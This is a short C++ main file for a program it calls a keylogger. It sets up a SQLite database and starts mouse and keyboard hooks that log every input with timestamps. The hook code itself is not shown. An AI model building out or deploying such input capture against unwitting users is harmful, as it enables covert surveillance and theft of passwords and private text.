#include "mouseHook.h"

#include <ctime>
#include <iostream>
#include <thread>
#include <fstream>
#include <iterator>


int main(int argc, char** argv) 
{
	Database db;
	int time;
	std::ifstream config("../../config.txt");
	config >> time;
	
	db.createDatabase("keylogger.sqlite3");	
	std::string cols[2] = { "time, key" };

	db.createTable("keyboard", 2, cols);
	db.clear("keyboard");

	db.createTable("mouse", 2, cols);
	db.clear("mouse");

	MouseHook mouseHook;
	mouseHook.start(db);

	Keylogger keylogger;
	keylogger.start(db);

	return 0;
}